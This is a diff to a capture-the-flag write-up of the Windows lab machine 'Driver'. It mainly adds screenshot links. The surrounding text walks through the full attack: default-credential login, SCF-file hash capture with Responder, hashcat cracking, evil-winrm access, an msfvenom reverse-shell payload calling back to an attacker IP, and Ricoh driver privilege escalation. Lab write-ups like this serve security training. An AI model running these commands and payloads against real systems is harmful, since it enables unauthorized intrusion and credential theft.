@@ -1,7 +1,7 @@
 # Driver 
-
-## Enumeration
-### nmap
+## Windows, Easy
+### Enumeration
+#### nmap
 ```
 nmap -p- -A -Pn <IP> -o nmap.txt
 
@@ -24,7 +24,7 @@ The first thing I am going to try is basic administrator logins
 
 And we actually got in using the admin:admin creds!
 
-![Succssful login with admin:admin]()
+![Succssful login with admin:admin](Screenshots/Login_successful.png)
 
 Now that we have access to the login page, i started to move around the site and see what we can access/do
 Looks like only the "Firmware Updates" works! looks like we are able to upload a file
@@ -57,7 +57,7 @@ responder -i eth0 -dwp
 
 Now that responder is running, we can upload the scf file
 
-![hash gatheirng]()
+![hash gatheirng](Screenshots/Hash_access.png)
 
 We got a hash for the user 'tony'!
 
@@ -81,7 +81,7 @@ rockyou.txt is the wordlist I am using againt the ntlm hash we gathered.
 After I run that, you may need to run the same hashcat command with the --show command. As you can see below we had too and how have a password "liltony"
 Now we have full creds
 
-![Hash_Cracked]()
+![Hash_Cracked](Screenshots/hash_cracked.png)
 
 username: **Tony**
 Password: **liltony**
@@ -92,7 +92,7 @@ Now that we have these creds we can use crackmapexec to confirm they are good cr
 crackmapexec winrm 10.10.11.106 -u tony -p liltony
 ```
 
-![Test_Creds]()
+![Test_Creds](Screenshots/crack_test_creds.png)
 
 With the flag 'Pwn3d' means that these creds were were able to authenticate successfully!
 
@@ -100,7 +100,7 @@ We can now use Win-rm to get shell access
 ```
 evil-winrm -i 10.10.11.106 -u tony -p liltony
 ```
-![winrm_auth]
+![winrm_auth](Screenshots/winrm_auth.png)
 
 Now that we have access, we can get the user flag~! 
 
@@ -110,7 +110,7 @@ Now that we have achived intial access, we need to see if we can elevate our pri
 
 First, I am gonig to start with WinPeas and let us run and look thorugh teh results.
 
-![WinPeas]()
+![WinPeas](Screenshots/winpeas.png)
 
 looking through the results, there are a few things of interest. One is the powershell and cmd history. We may be able to see some admisitrative actions on this device
 
@@ -121,13 +121,13 @@ Through my research, I did not see much available as per manual exploits on the 
 Bases on these, I am going to switch my shell over from an evil-winrm to a meterpreter shell
 
 The first thing i need to do is create my payload with msfvenom
-![payload_creation]
+![payload_creation](Screenshots/msfvenom_payload.png)
 
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe -o rev.exe
 ```
 after i have my payload, i an use the upload function in my evil-winrm shell to upload the file
-![Paylod_upload]()
+![Paylod_upload](Screenshots/Payload_upload.png)
 
 Now we can open up Metasploit using the msfconsole command.
 
@@ -139,7 +139,7 @@ Now that we have that module selected, we need to add a few things, the LHOST or
 
 We need to set the payload to be the same that our initial payload had. in this case, i went with a windows meterpreter session as it has added capabilities
 
-![msfconsole_1]()
+![msfconsole_1](Screenshots/msfconsole_1.png)
 
 once we have the listener is place, we can run both. Start the listener first, then run the exe file that we uploaded into the victim box
 
@@ -156,10 +156,10 @@ to run that, we first need to background are current session.
 
 then we can use the use post/multi/recon/local_exploit_suggester. for this, all we need to do is set the session number and run it.
 
-![local_priv_finder]()
+![local_priv_finder](Screenshots/local_priv_finder.png)
 
 looking through the results, we do see the ricoh driver
-![ricoh_driver]()
+![ricoh_driver](Screenshots/ricoh_driver.png)
 
 Although it shows its not exploitable, we can try anyways
 
@@ -170,12 +170,12 @@ use exploit/windows/local/ricoh_driver_privesc
 use the options command to see what needs to be set. in this case session, lhost, and lport
 
 I ran this a few times but could not properly execute it
-![exploit_attempt_1]()
+![exploit_attempt_1](Screenshots/exploit_attempt_1.png)
 I was getting a "[-] Exploit failed: undefined method `process' for nil:NilClass" process
 
 i got stuck here a bit, as this was a process error, i ran the ps command to view all of the processes running on the device
 
-![process]()
+![process](Screenshots/process.png)
 
 The only thing I can see is that the session number is different on my rev.exe process vs the rest of them running as the user on this device.
 
@@ -185,11 +185,11 @@ lets try and change our session number by migrateing with another process
 
 we can use anything that is running at session 1. in this case, i chose explorer.exe with the Migrate -N command
 
-![migrate_process]()
+![migrate_process](Screenshots/migrate_process.png)
 
 I ran it again but i am still getting an error, but it is different this time.
 
-![Error_2]()
+![Error_2](Screenshots/error_2.png)
 
 Now we are getting a payload issue
 
@@ -197,7 +197,7 @@ using the options command, i can see that the payload is different that what was
 
 I reset the payload options, and BOOM! we are now NT AUTHORITY\SYSTEM
 
-![Final]()
+![Final](Screenshots/final.png)
 
 Now that we are system! Go get that flag!
 
